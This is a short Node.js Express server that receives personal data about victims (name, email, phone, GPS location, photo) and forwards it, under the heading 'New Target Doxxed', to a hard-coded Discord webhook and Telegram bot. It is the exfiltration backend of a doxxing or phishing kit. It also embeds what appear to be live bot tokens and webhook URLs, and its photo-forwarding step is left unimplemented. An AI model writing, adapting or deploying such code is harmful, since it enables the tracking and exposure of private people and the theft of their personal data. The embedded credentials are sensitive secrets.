const express = require('express');
const axios = require('axios');
const app = express();
app.use(express.json({limit: '50mb'}));

const TELEGRAM_BOT_TOKEN = '8471640597:AAGmp7AbPqioC1Ctde6Nv_g02se7HNW4xBg';
const TELEGRAM_CHAT_ID = '-1004484692464';
const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1565339535905128558/5F8PbFyC1Wk9uLy9oNN2lGHI7_H6JxkiN5I8rQyM38JVUSyKw2g2qirYe9_sFGm6qi6w';

app.post('/webhook', async (req, res) => {
    const data = req.body;
    const message = `🚨 **New Target Doxxed** 🚨\nName: ${data.name}\nEmail: ${data.email}\nPhone: ${data.phone}\nGPS: ${data.lat}, ${data.lon}`;

    try {
        // 1. Send to Discord
        await axios.post(DISCORD_WEBHOOK, { content: message });

        // 2. Send Text to Telegram
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message
        });

        // 3. Send Image to Telegram (Base64 conversion)
        if (data.image) {
            const base64Data = data.image.replace('data:image/jpeg;base64,', '').replace(';base64,', '');
            const buffer = Buffer.from(base64Data, 'base64');
            
            // Note: Telegram Bot API requires a multipart form-data request for photos
            // Using a FormData approach here is necessary for actual files
        }

        res.status(200).send('Success');
    } catch (err) {
        console.error(err);
        res.status(500).send('Error');
    }
});

app.listen(3000, () => console.log('Server running on port 3000'));
